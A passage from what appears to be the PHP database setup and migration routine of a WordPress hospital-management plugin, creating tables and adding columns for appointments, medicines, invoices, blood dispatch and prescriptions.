		  PRIMARY KEY (`income_id`)
		  )DEFAULT CHARSET=utf8" ;
	
	dbDelta($sql);
	
	$table_hmgt_message_replies = $wpdb->prefix . 'hmgt_message_replies';
		$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_message_replies." (
			  `id` int(11) NOT NULL AUTO_INCREMENT,
			  `message_id` int(11) NOT NULL,
			  `sender_id` int(11) NOT NULL,
			  `receiver_id` int(11) NOT NULL,
			  `message_comment` text NOT NULL,
			  `created_date` datetime NOT NULL,
			  PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8";
	
	dbDelta($sql);	
	
	
	
	$table_hmgt_instrument = $wpdb->prefix . 'hmgt_instrument';
		$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_instrument." (
			   `id` int(11) NOT NULL AUTO_INCREMENT,
			  `instrument_code` varchar(255) NOT NULL,
			  `instrument_name` varchar(255) NOT NULL,
			  `charge_type` varchar(20) NOT NULL,
			  `instrument_charge` varchar(20) NOT NULL,
			  `instrument_description` text NOT NULL,
			  `code` varchar(255) NOT NULL,
			  `name` varchar(255) NOT NULL,
			  `address` text NOT NULL,
			  `contact` varchar(255) NOT NULL,
			  `description` text NOT NULL,
			  `quantity` varchar(255) NOT NULL,
			  `price` varchar(255) NOT NULL,
			  `class` varchar(255) NOT NULL,
			  `serial` varchar(255) NOT NULL,
			  `acquire` varchar(255) NOT NULL,
			  `asset_id` varchar(255) NOT NULL,
			  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
			  `created_by` int(11) NOT NULL,
			  PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8";
	
	$wpdb->query($sql);	
	
	
	$table_hmgt_assign_instrument = $wpdb->prefix . 'hmgt_assign_instrument';
		$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_assign_instrument." (
			  `id` int(11) NOT NULL AUTO_INCREMENT,
			  `patient_id` int(11) NOT NULL,
			  `instrument_id` int(11) NOT NULL,
			  `charge_type` varchar(20) NOT NULL,
			  `start_date` date NOT NULL,
			  `end_date` date NOT NULL,
			  `start_time` varchar(20) NOT NULL,
			  `end_time` varchar(20) NOT NULL,
			  `charges_amount` varchar(20) NOT NULL,
			  `description` text NOT NULL,
			  `created_by` int(11) NOT NULL,
			  `created_at` date NOT NULL,
			  PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8";
	
	$wpdb->query($sql);	
	
		$table_hmgt_apoointment_time= $wpdb->prefix . 'hmgt_apointment_time';
		$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_apoointment_time." (
				  `id` int(11) NOT NULL AUTO_INCREMENT,
				  `user_id` int(11) NOT NULL,
				  `apointment_startdate` date NOT NULL,
				  `apointment_enddate` date NOT NULL,
				  `apointment_time` text NOT NULL,
				  `day` text NOT NULL,
				  `created_by` int(11) NOT NULL,
				  `created_date` date NOT NULL,
				  PRIMARY KEY (`id`)
				   )DEFAULT CHARSET=utf8";
		$wpdb->query($sql);
		
	$table_hmgt_dispatch_blood = $wpdb->prefix . 'hmgt_dispatch_blood';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_dispatch_blood." (
			 `dispatchblood_id` int(11) NOT NULL AUTO_INCREMENT,
			  `patient_id` int(11) NOT NULL,			 
			  `blood_group` varchar(20) NOT NULL,
			  `blood_charge` double NOT NULL,
			  `tax` varchar(100) NULL,
			  `total_tax` double NOT NULL,
			  `total_blood_charge` double NOT NULL,
			  `blood_status` int(10) NOT NULL,
			  `date` date NOT NULL,
			  `dispatch_blood_create_date` date NOT NULL,
			  `dispatch_blood_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`dispatchblood_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);	
	
	$table_hmgt_taxes = $wpdb->prefix . 'hmgt_taxes';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_taxes." (
			  `tax_id` int(11) NOT NULL AUTO_INCREMENT,
			  `tax_title` varchar(255) NOT NULL,
			  `tax_value` double NOT NULL,
			   `created_date` date NOT NULL,	 
			  PRIMARY KEY (`tax_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);	
	
	$custom_field =  'custom_field';
	
	if (!in_array($custom_field, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $custom_field     ADD $table_hmgt_priscription     VARCHAR(6000)     NOT NULL");
	}
	
	$medicine_expiry_date='medicine_expiry_date';
	$manufactured_date='manufactured_date';
	$med_quantity='med_quantity';
	$batch_number='batch_number';
	$note='note';
	$med_tax='med_tax';
	$med_uniqueid='med_uniqueid';
	
	$table_hmgt_medicine = $wpdb->prefix . 'hmgt_medicine';	
	
	if (!in_array($medicine_expiry_date, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER     TABLE $table_hmgt_medicine  ADD   $medicine_expiry_date   varchar(50) NOT NULL");}		
	if (!in_array($manufactured_date, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER     TABLE $table_hmgt_medicine  ADD   $manufactured_date   varchar(50) NOT NULL");}	
	
	if (!in_array($med_quantity, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER     TABLE $table_hmgt_medicine  ADD   $med_quantity   int(11) NOT NULL");}	
	
	if (!in_array($batch_number, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER     TABLE $table_hmgt_medicine  ADD   $batch_number   varchar(100) NOT NULL");}		
			
	if (!in_array($note, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER  TABLE $table_hmgt_medicine  ADD   $note   text NOT NULL");}			
	if (!in_array($med_tax, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER TABLE $table_hmgt_medicine  ADD  $med_tax  double NOT NULL");}		
	
	if (!in_array($med_uniqueid, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER TABLE $table_hmgt_medicine  ADD  $med_uniqueid  varchar(100) NOT NULL");}		
		
	$table_hmgt_dispatch_medicine = $wpdb->prefix . 'hmgt_dispatch_medicine';
	
	$total_tax_amount='total_tax_amount';
	
	if (!in_array($total_tax_amount, $wpdb->get_col( "DESC " . $table_hmgt_dispatch_medicine, 0 ) )){  $result= $wpdb->query(
			"ALTER TABLE $table_hmgt_dispatch_medicine  ADD  $total_tax_amount  int(20) NOT NULL");}	
			
	$post_id='post_id';
	$table_hmgt_message = $wpdb->prefix.'hmgt_message';	
	if (!in_array($post_id, $wpdb->get_col( "DESC " . $table_hmgt_message, 0 ) )){  
		$result= $wpdb->query("ALTER TABLE $table_hmgt_message  ADD   $post_id   int(11)");
	}
			
	$bed_location='bed_location';
	$tax='tax';
	$table_hmgt_bed = $wpdb->prefix . 'hmgt_bed';	
	if (!in_array($bed_location, $wpdb->get_col( "DESC " . $table_hmgt_bed, 0 ) )){  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_bed  ADD   $bed_location   TEXT");
	}
	if (!in_array($tax, $wpdb->get_col( "DESC " . $table_hmgt_bed, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_bed  ADD $tax varchar(100)");
	}
	$table_hmgt_instrument = $wpdb->prefix . 'hmgt_instrument';
	$tax='tax';
	if (!in_array($tax, $wpdb->get_col( "DESC " . $table_hmgt_instrument, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_instrument  ADD $tax varchar(100)");
	}
	$blood_status='blood_status';
	$table_hmgt_bld_donor = $wpdb->prefix . 'hmgt_bld_donor';	
	if (!in_array($blood_status, $wpdb->get_col( "DESC " . $table_hmgt_bld_donor, 0 ) ))
	{  
		$result= $wpdb->query("ALTER TABLE $table_hmgt_bld_donor  ADD   $blood_status   int(10)");
	}	

	 $table_hmgt_patient_transation = $wpdb->prefix . 'hmgt_patient_transation';
		$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_patient_transation." (
			   `id` int(20) NOT NULL AUTO_INCREMENT,
			  `type` varchar(20) NOT NULL,
			  `type_id` int(20) NOT NULL,
			  `type_value` varchar(200) NOT NULL,
			  `status` varchar(20) NOT NULL,
			  `unit` varchar(20) NOT NULL,
			  `date` varchar(20) NOT NULL,
			  `patient_id` int(20) NOT NULL,
			  `refer_id` int(11) NOT NULL,
			  PRIMARY KEY (`id`)) DEFAULT CHARSET=utf8";
	
	$wpdb->query($sql);	 

	
	$table_hmgt_patient_doctor = $wpdb->prefix . 'hmgt_asign_doctor';
		$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_patient_doctor." (
			   `id` int(20) NOT NULL AUTO_INCREMENT,
			  `patient_id` int(20) NOT NULL,
			  `doctor_id` int(20) NOT NULL,
			  PRIMARY KEY (`id`)) DEFAULT CHARSET=utf8";
	
	$wpdb->query($sql);	
	
	$comments='comments';
	$table_hmgt_invoice = $wpdb->prefix . 'hmgt_invoice';	
	if (!in_array($comments, $wpdb->get_col( "DESC " . $table_hmgt_invoice, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_invoice  ADD   $comments   TEXT");
	}
	
	$new_field='payment_type';
	$table_hmgt_invoice = $wpdb->prefix . 'hmgt_invoice';	
	if (!in_array($new_field, $wpdb->get_col( "DESC " . $table_hmgt_invoice, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_invoice  ADD   $new_field   varchar(255)");
	}
	
	$appointment_time_string='appointment_time_string';
	$table_hmgt_appointment = $wpdb->prefix . 'hmgt_appointment';	
	if (!in_array($appointment_time_string, $wpdb->get_col( "DESC " . $table_hmgt_appointment, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_appointment  ADD   $appointment_time_string   varchar(50)");
	} 
	
	$adjustment_amount='adjustment_amount';
	$table_hmgt_invoice = $wpdb->prefix . 'hmgt_invoice';	
	if (!in_array($adjustment_amount, $wpdb->get_col( "DESC " . $table_hmgt_invoice, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_invoice  ADD   $adjustment_amount   varchar(20)");
	}
	
	 $new_field1='gr_state';
	 $new_field2='gr_country';
	 $new_field3='gr_zipcode';
	 
	 $table_hmgt_altergardian = $wpdb->prefix . 'hmgt_inpatient_guardian';	
	 if (!in_array($new_field1, $wpdb->get_col( "DESC " . $table_hmgt_altergardian, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_altergardian  ADD   $new_field1   varchar(100)");
	}
	if (!in_array($new_field2, $wpdb->get_col( "DESC " . $table_hmgt_altergardian, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_altergardian  ADD   $new_field2   varchar(100)");
	}
	if (!in_array($new_field3, $wpdb->get_col( "DESC " . $table_hmgt_altergardian, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_altergardian  ADD   $new_field3   int(11)");
	}
	$table_hmgt_patient_transation = $wpdb->prefix .'hmgt_patient_transation';

	$invoice_id='invoice_id';
	
	if (!in_array($invoice_id, $wpdb->get_col( "DESC " . $table_hmgt_patient_transation, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_patient_transation  ADD   $invoice_id   int(11)");
	}
	
	$table_hmgt_appointment = $wpdb->prefix . 'hmgt_appointment';
	$appointment_time_with_a='appointment_time_with_a';
	
	if (!in_array($appointment_time_with_a, $wpdb->get_col( "DESC " . $table_hmgt_appointment, 0 ) )){  
		$result= $wpdb->query("ALTER     TABLE $table_hmgt_appointment  ADD   $appointment_time_with_a  text");
	}	
	
	$table_hmgt_appointment = $wpdb->prefix . 'hmgt_appointment';
	$appointment_time='appointment_time';
	$result= $wpdb->query("ALTER TABLE $table_hmgt_appointment MODIFY COLUMN $appointment_time text");
	
	$table_hmgt_ambulance_req = $wpdb->prefix . 'hmgt_ambulance_req';
	$charge='charge';
	$tax='tax';
	$total_tax='total_tax';
	$total_charge='total_charge';
	
	$result= $wpdb->query("ALTER TABLE $table_hmgt_ambulance_req MODIFY COLUMN $charge FLOAT");
	if (!in_array($tax, $wpdb->get_col( "DESC " . $table_hmgt_ambulance_req, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_ambulance_req  ADD  $tax  varchar(100)");
	}	
	if (!in_array($total_tax, $wpdb->get_col( "DESC " . $table_hmgt_ambulance_req, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_ambulance_req  ADD  $total_tax  double");
	}	
	if (!in_array($total_charge, $wpdb->get_col( "DESC " . $table_hmgt_ambulance_req, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_ambulance_req  ADD  $total_charge  double");
	}	
	$table_hmgt_medicine = $wpdb->prefix . 'hmgt_medicine';
	$medicine_price='medicine_price';
	$med_tax='med_tax';
	$med_discount='med_discount';
	$med_discount_in='med_discount_in';
	$result= $wpdb->query("ALTER TABLE $table_hmgt_medicine MODIFY COLUMN $medicine_price double");
	$result= $wpdb->query("ALTER TABLE $table_hmgt_medicine MODIFY COLUMN $med_tax varchar(100)");
	if (!in_array($med_discount, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_medicine  ADD  $med_discount double");
	}	
	if (!in_array($med_discount_in, $wpdb->get_col( "DESC " . $table_hmgt_medicine, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_medicine  ADD  $med_discount_in varchar(50)");
	}	
	
	$table_hmgt_dispatch_medicine = $wpdb->prefix . 'hmgt_dispatch_medicine';
	$madicine='madicine';
	$med_price='med_price';
	$total_tax_amount='total_tax_amount';
	$discount='discount';
	$sub_total='sub_total';
	$result= $wpdb->query("ALTER TABLE $table_hmgt_dispatch_medicine MODIFY COLUMN $madicine text");
	$result= $wpdb->query("ALTER TABLE $table_hmgt_dispatch_medicine MODIFY COLUMN $med_price double");
	$result= $wpdb->query("ALTER TABLE $table_hmgt_dispatch_medicine MODIFY COLUMN $total_tax_amount double");
	$result= $wpdb->query("ALTER TABLE $table_hmgt_dispatch_medicine MODIFY COLUMN $discount double");
	$result= $wpdb->query("ALTER TABLE $table_hmgt_dispatch_medicine MODIFY COLUMN $sub_total double");
	
	$table_hmgt_ot = $wpdb->prefix . 'hmgt_ot';
	$operation_charge='operation_charge';
	$out_come_status='out_come_status';	
	$ot_tax='ot_tax';
	$ot_charge='ot_charge';
	
	$result= $wpdb->query("ALTER TABLE $table_hmgt_ot MODIFY COLUMN $operation_charge double");
	
	if (!in_array($out_come_status, $wpdb->get_col( "DESC " . $table_hmgt_ot, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_ot  ADD  $out_come_status  varchar(25)");
	}		
	if (!in_array($ot_tax, $wpdb->get_col( "DESC " . $table_hmgt_ot, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_ot  ADD  $ot_tax  double");
	}	
	if (!in_array($ot_charge, $wpdb->get_col( "DESC " . $table_hmgt_ot, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_ot  ADD  $ot_charge double");
	}	
	
	$table_hmgt_diagnosis = $wpdb->prefix . 'hmgt_diagnosis';
	$report_cost='report_cost';	
	$total_tax='total_tax';
	$total_cost='total_cost';
	
	$result= $wpdb->query("ALTER TABLE $table_hmgt_diagnosis MODIFY COLUMN $report_cost FLOAT");
	
	if (!in_array($total_tax, $wpdb->get_col( "DESC " . $table_hmgt_diagnosis, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_diagnosis  ADD  $total_tax double");
	}	
	if (!in_array($total_cost, $wpdb->get_col( "DESC " . $table_hmgt_diagnosis, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_diagnosis  ADD  $total_cost double");
	}	
	
	$table_hmgt_invoice = $wpdb->prefix . 'hmgt_invoice';
	$invoice_amount='invoice_amount';
	$paid_amount='paid_amount';
	$result= $wpdb->query("ALTER TABLE $table_hmgt_invoice MODIFY COLUMN $invoice_amount double");
	
	if (!in_array($paid_amount, $wpdb->get_col( "DESC " . $table_hmgt_invoice, 0 ) ))
	{  
		$result= $wpdb->query("ALTER TABLE $table_hmgt_invoice  ADD   $paid_amount double");
	}
	
	$operation_status='operation_status';
	if (!in_array($operation_status, $wpdb->get_col( "DESC " . $table_hmgt_ot, 0 ) )){  
		$result= $wpdb->query("ALTER TABLE $table_hmgt_ot  ADD   $operation_status   varchar(25)");
	}
	
	$table_hmgt_priscription = $wpdb->prefix . 'hmgt_priscription';
	$prescription_type='prescription_type';
	$report_description='report_description';
	$doctor_id='doctor_id';
	
	if (!in_array($prescription_type, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_priscription  ADD   $prescription_type  varchar(25)");
	}
	if (!in_array($report_description, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_priscription  ADD   $report_description  text");
	}
	if (!in_array($doctor_id, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_priscription  ADD   $doctor_id  int(11)");
	}
	
	$table_hmgt_patient_transation = $wpdb->prefix . 'hmgt_patient_transation';
	$type_id='type_id';
	$type='type';
	$type_discount='type_discount';
	$type_tax='type_tax';
	$type_total_value='type_total_value';
	
	$result= $wpdb->query("ALTER TABLE $table_hmgt_patient_transation MODIFY COLUMN $type_id varchar(100)");
	$result= $wpdb->query("ALTER TABLE $table_hmgt_patient_transation MODIFY COLUMN $type varchar(100)");
	
	if (!in_array($type_tax, $wpdb->get_col( "DESC " . $table_hmgt_patient_transation, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_patient_transation  ADD  $type_tax  varchar(200)");
	}
	if (!in_array($type_discount, $wpdb->get_col( "DESC " . $table_hmgt_patient_transation, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_patient_transation  ADD  $type_discount  varchar(200)");
	}
	if (!in_array($type_total_value, $wpdb->get_col( "DESC " . $table_hmgt_patient_transation, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_patient_transation  ADD $type_total_value  varchar(200)");
	}
	$table_hmgt_assign_instrument = $wpdb->prefix . 'hmgt_assign_instrument';
	$total_tax='total_tax';
	$total_charge_amount='total_charge_amount';
	if (!in_array($total_tax, $wpdb->get_col( "DESC " . $table_hmgt_assign_instrument, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_assign_instrument  ADD   $total_tax  double");
	}
	if (!in_array($total_charge_amount, $wpdb->get_col( "DESC " . $table_hmgt_assign_instrument, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_assign_instrument  ADD   $total_charge_amount double");
	} 
	$table_hmgt_treatment = $wpdb->prefix . 'hmgt_treatment';
	$treatment_tax='tax';
	if (!in_array($treatment_tax, $wpdb->get_col( "DESC " . $table_hmgt_treatment, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_treatment  ADD $treatment_tax varchar(100)");
	} 
	
	$table_hmgt_priscription = $wpdb->prefix . 'hmgt_priscription';
	$report_type='report_type';
	$doctor_visiting_charge='doctor_visiting_charge';
	$doctor_consulting_charge='doctor_consulting_charge';
	if (!in_array($report_type, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_priscription  ADD $report_type varchar(100) NULL");
	} 
	if (!in_array($doctor_visiting_charge, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_priscription  ADD $doctor_visiting_charge varchar(100) NULL");
	} 
	if (!in_array($doctor_consulting_charge, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_priscription  ADD $doctor_consulting_charge varchar(100) NULL");
	} 
	
	$status='status';
	if (!in_array($status, $wpdb->get_col( "DESC " . $table_hmgt_priscription, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_priscription  ADD $status varchar(100) NULL");
	} 
	$table_hmgt_income_expense = $wpdb->prefix . 'hmgt_income_expense';
	$payment_method='payment_method';
	$payment_description='payment_description';
	$invoice_id='invoice_id';
	if (!in_array($payment_method, $wpdb->get_col( "DESC " . $table_hmgt_income_expense, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_income_expense  ADD $payment_method varchar(100)");
	} 
	if (!in_array($payment_description, $wpdb->get_col( "DESC " . $table_hmgt_income_expense, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_income_expense  ADD $payment_description text");
	} 
	if (!in_array($invoice_id, $wpdb->get_col( "DESC " . $table_hmgt_income_expense, 0 ) ))
	{  
		$result= $wpdb->query("ALTER  TABLE $table_hmgt_income_expense  ADD $invoice_id int(11)");
	} 
}
?>